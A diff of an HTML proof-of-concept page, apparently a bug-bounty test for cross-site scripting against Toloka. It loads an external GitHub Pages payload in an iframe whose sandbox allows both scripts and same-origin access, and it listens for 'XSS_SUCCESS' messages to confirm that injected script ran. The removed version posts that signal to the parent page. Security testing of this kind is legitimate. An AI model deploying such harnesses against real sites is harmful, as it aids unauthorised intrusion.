@@ -1,19 +1,56 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>PoC iframe exploit for Toloka</title>
+  <meta charset="UTF-8" />
+  <title>🔥 iframe XSS Bridge</title>
+  <style>
+    body {
+      background-color: #111;
+      color: #0f0;
+      font-family: monospace;
+      padding: 2em;
+    }
+    iframe {
+      width: 100%;
+      height: 300px;
+      border: 2px dashed #0f0;
+      margin-top: 1em;
+    }
+    .log {
+      background: #222;
+      padding: 1em;
+      border-radius: 8px;
+      margin-top: 1em;
+      white-space: pre-wrap;
+    }
+  </style>
 </head>
-<body style="background:#000;color:#fff;font-family:monospace;">
-  <h1>🔥 PoC iframe exploit loaded</h1>
-  <p>Domain: <code id="d"></code></p>
+<body>
+  <h1>🚨 Sandbox iframe Exploit Test</h1>
+  <p><strong>Status:</strong> <span id="status">Waiting for iframe...</span></p>
+
+  <iframe 
+    id="exploitIframe"
+    src="https://baali07.github.io/XSS-PoC/dn.html"
+    sandbox="allow-scripts allow-same-origin"
+  ></iframe>
+
+  <div class="log" id="log">[Log]</div>
+
   <script>
-    document.getElementById('d').textContent = location.origin;
+    window.addEventListener("message", function (event) {
+      if (event.origin !== "https://baali07.github.io") return; // أصل موثوق فقط
+      const msg = event.data;
 
-    // الماضي: التواصل مع الصفحة الأم
-    window.parent.postMessage("XSS_SUCCESS|" + location.origin, "*");
-
-  
+      if (typeof msg === "string" && msg.startsWith("XSS_SUCCESS|")) {
+        const origin = msg.split("|")[1];
+        document.getElementById("status").textContent = "✅ XSS Confirmed from: " + origin;
+        alert("🔥 XSS payload triggered from: " + origin);
+        document.getElementById("log").textContent += "\n[XSS Triggered] => " + origin;
+      } else {
+        document.getElementById("log").textContent += "\n[Unknown Message] => " + JSON.stringify(msg);
+      }
+    });
   </script>
 </body>
 </html>
